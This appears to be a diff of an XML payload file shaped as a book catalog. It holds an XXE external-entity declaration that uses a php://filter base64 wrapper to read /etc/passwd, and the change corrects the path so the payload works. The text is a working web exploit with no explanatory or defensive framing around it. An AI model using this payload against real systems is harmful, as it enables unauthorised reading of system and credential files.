@@ -1,6 +1,6 @@
 <?xml version="1.0"?>
 <!DOCTYPE B00KS [
-<!ENTITY leaked SYSTEM "php://filter/convert.base64-encode/resource=etc/passwd">
+<!ENTITY leaked SYSTEM "php://filter/convert.base64-encode/resource=/etc/passwd">
 ]>
 <catalog>
    <book id="bk101">
